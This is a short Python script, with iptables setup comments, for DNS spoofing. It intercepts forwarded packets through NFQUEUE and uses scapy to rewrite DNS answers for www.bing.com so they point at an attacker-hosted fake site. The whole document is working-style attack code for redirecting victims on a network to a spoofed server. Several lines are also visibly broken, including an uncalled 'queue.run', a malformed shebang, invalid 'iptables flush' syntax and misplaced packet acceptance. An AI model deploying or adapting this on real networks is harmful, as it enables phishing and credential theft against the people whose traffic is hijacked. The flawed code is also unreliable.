#Execute command -> iptables -I FORWARD -j NFQUEUE --queue-num 0
#Execute command -> pip install netfilterqueue
#Execute command -> iptables flush //after executing program to delete the tables

#!usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):#checking the dns response i.e DNSRR
        qname = scapy_packet[scapy.DNSQR].qname #checking the query which is part of the response
        if "www.bing.com" in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rname=qname, rdata="IP_ADDRESS_of_FAKE_SITE")
            scapy_packet[scapy.DNS].an = answer #changing the ip of bing.com to our hosted web server
            scapy_packet[scapy.DNS].ancount = 1

            #length and checksum is deleted and scapy re-calculates it for us so that the packet isn't corrupted
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

        packet.accept()

#When packet is sent to DNS, it will process the original first and the the modified one
#This is because there's a time delay to modify the packet
#Thus packets are put in a queue and then send to the dns server   
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run